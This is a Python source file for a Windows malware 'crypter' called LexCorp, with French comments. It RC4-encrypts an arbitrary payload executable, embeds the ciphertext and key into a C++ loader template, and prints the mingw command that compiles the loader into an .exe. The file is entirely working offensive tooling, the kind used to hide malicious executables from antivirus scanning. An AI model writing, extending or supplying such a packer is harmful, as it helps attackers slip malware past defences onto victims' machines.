#!/usr/bin/env python3
# language: Python 3, file: lex_crypter.py, target: macOS (outillage du crypter Windows)
# LexCorp packer : RC4-encrypte un exe Windows et genere le source du loader
# Usage: python3 lex_crypter.py payload.exe [sortie_loader.cpp]
import sys, os, secrets

def rc4(data, key):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)

def main():
    payload = sys.argv[1] if len(sys.argv) > 1 else "payload.exe"
    data = open(payload, "rb").read()
    key = secrets.token_bytes(16)
    enc = rc4(data, key)

    src = open(os.path.join(os.path.dirname(__file__), "src", "lex_crypter_win.cpp")).read()
    blob = ",".join(f"0x{b:02X}" for b in enc)
    k = ",".join(f"0x{b:02X}" for b in key)
    src = src.replace("/*LEX_BLOB*/", blob).replace("/*LEX_KEY*/", k)
    out = sys.argv[2] if len(sys.argv) > 2 else "lex_loader_gen.cpp"
    open(out, "w").write(src)
    print(f"[OK] {out} genere - payload {len(data)} o -> {len(enc)} o chiffres")
    print(f"     compile: x86_64-w64-mingw32-g++ -O2 -std=c++17 {out} -o lex_loader.exe")

if __name__ == "__main__":
    main()
